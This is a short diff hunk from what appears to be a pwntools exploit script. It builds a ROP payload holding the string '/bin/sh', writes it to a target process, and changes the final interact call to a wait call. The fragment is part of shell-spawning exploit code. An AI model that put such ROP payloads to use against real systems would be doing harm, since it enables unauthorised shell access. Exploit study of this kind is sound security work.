@@ -36,4 +36,4 @@ buf += rop.string('/bin/sh')
 buf += rop.fill(100, buf)
 
 p.write(buf)
-p.interact(0)
+p.wait(0)
